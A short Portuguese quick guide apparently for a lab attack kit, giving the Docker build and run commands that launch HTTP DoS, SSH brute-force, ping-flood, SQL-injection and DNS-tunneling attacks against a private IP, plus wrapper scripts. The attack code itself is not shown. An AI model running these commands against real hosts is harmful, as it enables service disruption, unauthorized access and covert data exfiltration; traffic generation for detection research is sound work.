# 🚀 Guia Rápido - Execução via Docker

Formato simples para executar os ataques diretamente via Docker.

## DoS HTTP Attack

```bash
cd dos-http
docker build -t dos-http .
docker run --rm --network host dos-http 192.168.137.141
```

---

## Brute Force SSH Attack

```bash
cd brute-force-ssh
docker build -t brute-force-ssh .
docker run --rm --network host brute-force-ssh 192.168.137.141
```

---

## Ping Flood (ICMP) Attack

```bash
cd ping-flood
docker build -t ping-flood .
docker run --rm --network host --cap-add=NET_RAW ping-flood 192.168.137.141
```

**Nota:** `--cap-add=NET_RAW` é necessário para usar hping3.

---

## SQL Injection Attack

```bash
cd sql-injection
docker build -t sql-injection .
docker run --rm --network host sql-injection 192.168.137.141
```

**Ou com URL completa:**
```bash
docker run --rm --network host sql-injection http://192.168.137.141/login.php
```

---

## DNS Tunneling Attack

```bash
cd dns-tunneling
docker build -t dns-tunneling .
docker run --rm --network host dns-tunneling
```

**Nota:** DNS Tunneling não requer IP (envia queries para 8.8.8.8).

---

## 📝 Resumo

**Formato padrão para todos (exceto DNS Tunneling):**
```bash
cd <pasta-do-ataque>
docker build -t <nome-imagem> .
docker run --rm --network host <nome-imagem> <TARGET_IP>
```

**Exceções:**
- **Ping Flood:** adicionar `--cap-add=NET_RAW` antes do nome da imagem
- **DNS Tunneling:** não passar IP
- **SQL Injection:** pode passar URL completa ao invés de IP

---

## ✅ Alternativa: Scripts Automáticos

Se preferir automatização, use os scripts:

```bash
./run-dos-http.sh 192.168.137.141
./run-brute-force-ssh.sh 192.168.137.141
./run-ping-flood.sh 192.168.137.141
./run-sql-injection.sh 192.168.137.141
./run-dns-tunneling.sh
```

Os scripts fazem o build automaticamente se necessário.

